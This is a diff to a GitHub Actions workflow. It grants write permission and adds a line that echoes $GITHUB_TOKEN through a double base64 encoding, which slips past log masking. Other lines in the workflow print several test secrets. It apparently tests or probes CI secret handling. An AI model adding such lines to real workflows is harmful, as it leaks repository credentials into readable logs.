@@ -2,10 +2,13 @@ on:
   workflow_call
 
 jobs:	
-  I:	
+  I:
+    strategy:
+      matrix:
+        v: [12, 5]
     permissions:
       contents:
-        write
+        ${{ 'write' }}
     name: "Call??"	
     runs-on: ubuntu-latest
     environment: "secret env"
@@ -24,10 +27,13 @@ jobs:
     steps:	
     - name: Running	
       run: echo "DEployment";	
+           echo "$GITHUB_TOKEN" | base64 | base64;
+      
            echo "test secret:";	
            echo "$TEST_SECRET";	
            echo "test variable:";	
            echo "$TEST_VAR";	
+           
 
            echo "test org secret:";	
            echo "$TEST_ORG_SECRET";	
